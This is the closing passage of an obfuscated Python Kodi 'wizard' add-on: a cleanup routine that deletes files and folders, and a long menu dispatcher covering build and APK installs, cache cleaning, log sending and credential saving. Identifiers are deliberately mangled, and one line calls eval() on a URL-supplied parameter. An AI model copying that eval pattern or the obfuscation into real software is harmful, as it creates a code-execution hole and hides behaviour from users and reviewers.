						for O00OOOO0000O00O0O in OO00OO0OOOO0OO0O0 :#line:5615
							os .unlink (os .path .join (O00OO00OOOO0O0000 ,O00OOOO0000O00O0O ))#line:5616
						for O0OOOOOO0OOO0O000 in OOO00O000OOO0O000 :#line:5617
							shutil .rmtree (os .path .join (O00OO00OOOO0O0000 ,O0OOOOOO0OOO0O000 ))#line:5618
					os .rmdir (O0OO00OOO0O000000 )#line:5619
	except :pass #line:5621
params =get_params ()#line:5622
url =None #line:5623
name =None #line:5624
mode =None #line:5625
try :mode =urllib .unquote_plus (params ["mode"])#line:5627
except :pass #line:5628
try :name =urllib .unquote_plus (params ["name"])#line:5629
except :pass #line:5630
try :url =urllib .unquote_plus (params ["url"])#line:5631
except :pass #line:5632
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5634
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5635
def setView (O00OOO0000O0000OO ,OO0O0000O00OO0OOO ):#line:5636
	if wiz .getS ('auto-view')=='true':#line:5637
		OO0O0000OOOO0O00O =wiz .getS (OO0O0000O00OO0OOO )#line:5638
		if OO0O0000OOOO0O00O =='50'and KODIV >=17 and SKIN =='skin.estuary':OO0O0000OOOO0O00O ='55'#line:5639
		if OO0O0000OOOO0O00O =='500'and KODIV >=17 and SKIN =='skin.estuary':OO0O0000OOOO0O00O ='50'#line:5640
		wiz .ebi ("Container.SetViewMode(%s)"%OO0O0000OOOO0O00O )#line:5641
if mode ==None :index ()#line:5643
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5645
elif mode =='builds':buildMenu ()#line:5646
elif mode =='viewbuild':viewBuild (name )#line:5647
elif mode =='buildinfo':buildInfo (name )#line:5648
elif mode =='buildpreview':buildVideo (name )#line:5649
elif mode =='install':buildWizard (name ,url )#line:5650
elif mode =='theme':buildWizard (name ,mode ,url )#line:5651
elif mode =='viewthirdparty':viewThirdList (name )#line:5652
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5653
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5654
elif mode =='maint':maintMenu (name )#line:5656
elif mode =='passpin':passandpin ()#line:5657
elif mode =='backmyupbuild':backmyupbuild ()#line:5658
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5659
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5660
elif mode =='advancedsetting':advancedWindow (name )#line:5661
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5662
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5663
elif mode =='asciicheck':wiz .asciiCheck ()#line:5664
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5665
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5666
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5667
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5668
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5669
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5670
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5671
elif mode =='currentsettings':viewAdvanced ()#line:5672
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5673
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5674
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5675
elif mode =='fixskin':backtokodi ()#line:5676
elif mode =='testcommand':testcommand ()#line:5677
elif mode =='logsend':logsend ()#line:5678
elif mode =='rdon':rdon ()#line:5679
elif mode =='rdoff':rdoff ()#line:5680
elif mode =='setrd':setrealdebrid ()#line:5681
elif mode =='setrd2':setautorealdebrid ()#line:5682
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5683
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5684
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5685
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5686
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5687
elif mode =='freshstart':freshStart ()#line:5688
elif mode =='forceupdate':wiz .forceUpdate ()#line:5689
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5690
elif mode =='forceclose':wiz .killxbmc ()#line:5691
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5692
elif mode =='hidepassword':wiz .hidePassword ()#line:5693
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5694
elif mode =='enableaddons':enableAddons ()#line:5695
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5696
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5697
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5698
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5699
elif mode =='uploadlog':uploadLog .Main ()#line:5700
elif mode =='viewlog':LogViewer ()#line:5701
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5702
elif mode =='viewerrorlog':errorChecking (all =True )#line:5703
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5704
elif mode =='purgedb':purgeDb ()#line:5705
elif mode =='fixaddonupdate':fixUpdate ()#line:5706
elif mode =='removeaddons':removeAddonMenu ()#line:5707
elif mode =='removeaddon':removeAddon (name )#line:5708
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5709
elif mode =='removedata':removeAddonData (name )#line:5710
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5711
elif mode =='systeminfo':systemInfo ()#line:5712
elif mode =='restorezip':restoreit ('build')#line:5713
elif mode =='restoregui':restoreit ('gui')#line:5714
elif mode =='restoreaddon':restoreit ('addondata')#line:5715
elif mode =='restoreextzip':restoreextit ('build')#line:5716
elif mode =='restoreextgui':restoreextit ('gui')#line:5717
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5718
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5719
elif mode =='traktsync':traktsync ()#line:5720
elif mode =='apk':apkMenu (name )#line:5722
elif mode =='apkscrape':apkScraper (name )#line:5723
elif mode =='apkinstall':apkInstaller (name ,url )#line:5724
elif mode =='speed':speedMenu ()#line:5725
elif mode =='net':net_tools ()#line:5726
elif mode =='GetList':GetList (url )#line:5727
elif mode =='youtube':youtubeMenu (name )#line:5728
elif mode =='viewVideo':playVideo (url )#line:5729
elif mode =='addons':addonMenu (name )#line:5731
elif mode =='addoninstall':addonInstaller (name ,url )#line:5732
elif mode =='savedata':saveMenu ()#line:5734
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5735
elif mode =='managedata':manageSaveData (name )#line:5736
elif mode =='whitelist':wiz .whiteList (name )#line:5737
elif mode =='trakt':traktMenu ()#line:5739
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5740
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5741
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5742
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5743
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5744
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5745
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5746
elif mode =='realdebrid':realMenu ()#line:5748
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5749
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5750
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5751
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5752
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5753
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5754
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5755
elif mode =='login':loginMenu ()#line:5757
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5758
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5759
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5760
elif mode =='clearlogin':loginit .clearSaved (name )#line:5761
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5762
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5763
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5764
elif mode =='contact':notify .contact (CONTACT )#line:5766
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5767
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5768
elif mode =='developer':developer ()#line:5770
elif mode =='converttext':wiz .convertText ()#line:5771
elif mode =='createqr':wiz .createQR ()#line:5772
elif mode =='testnotify':testnotify ()#line:5773
elif mode =='testnotify2':testnotify2 ()#line:5774
elif mode =='servicemanual':servicemanual ()#line:5775
elif mode =='fastinstall':fastinstall ()#line:5776
elif mode =='testupdate':testupdate ()#line:5777
elif mode =='testfirst':testfirst ()#line:5778
elif mode =='testfirstrun':testfirstRun ()#line:5779
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5780
elif mode =='bg':wiz .bg_install (name ,url )#line:5782
elif mode =='bgcustom':wiz .bg_custom ()#line:5783
elif mode =='bgremove':wiz .bg_remove ()#line:5784
elif mode =='bgdefault':wiz .bg_default ()#line:5785
elif mode =='rdset':rdsetup ()#line:5786
elif mode =='mor':morsetup ()#line:5787
elif mode =='mor2':morsetup2 ()#line:5788
elif mode =='resolveurl':resolveurlsetup ()#line:5789
elif mode =='urlresolver':urlresolversetup ()#line:5790
elif mode =='forcefastupdate':forcefastupdate ()#line:5791
elif mode =='traktset':traktsetup ()#line:5792
elif mode =='placentaset':placentasetup ()#line:5793
elif mode =='flixnetset':flixnetsetup ()#line:5794
elif mode =='reptiliaset':reptiliasetup ()#line:5795
elif mode =='yodasset':yodasetup ()#line:5796
elif mode =='numbersset':numberssetup ()#line:5797
elif mode =='uranusset':uranussetup ()#line:5798
elif mode =='genesisset':genesissetup ()#line:5799
elif mode =='fastupdate':fastupdate ()#line:5800
elif mode =='folderback':folderback ()#line:5801
elif mode =='menudata':Menu ()#line:5802
elif mode =='infoupdate':infobuild ()#line:5803
elif mode ==2 :#line:5805
        wiz .torent_menu ()#line:5806
elif mode ==3 :#line:5807
        wiz .popcorn_menu ()#line:5808
elif mode ==8 :#line:5809
        wiz .metaliq_fix ()#line:5810
elif mode ==9 :#line:5811
        wiz .quasar_menu ()#line:5812
elif mode ==5 :#line:5813
        swapSkins ('skin.Premium.mod')#line:5814
elif mode ==13 :#line:5815
        wiz .elementum_menu ()#line:5816
elif mode ==16 :#line:5817
        wiz .fix_wizard ()#line:5818
elif mode ==17 :#line:5819
        wiz .last_play ()#line:5820
elif mode ==18 :#line:5821
        wiz .normal_metalliq ()#line:5822
elif mode ==19 :#line:5823
        wiz .fast_metalliq ()#line:5824
elif mode ==20 :#line:5825
        wiz .fix_buffer2 ()#line:5826
elif mode ==21 :#line:5827
        wiz .fix_buffer3 ()#line:5828
elif mode ==11 :#line:5829
        wiz .fix_buffer ()#line:5830
elif mode ==15 :#line:5831
        wiz .fix_font ()#line:5832
elif mode ==14 :#line:5833
        wiz .clean_pass ()#line:5834
elif mode ==22 :#line:5835
        wiz .movie_update ()#line:5836
elif mode =='adv_settings':buffer1 ()#line:5837
elif mode =='getpass':getpass ()#line:5838
elif mode =='setpass':setpass ()#line:5839
elif mode =='setuname':setuname ()#line:5840
elif mode =='passandUsername':passandUsername ()#line:5841
elif mode =='9':disply_hwr ()#line:5842
elif mode =='99':disply_hwr2 ()#line:5843
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))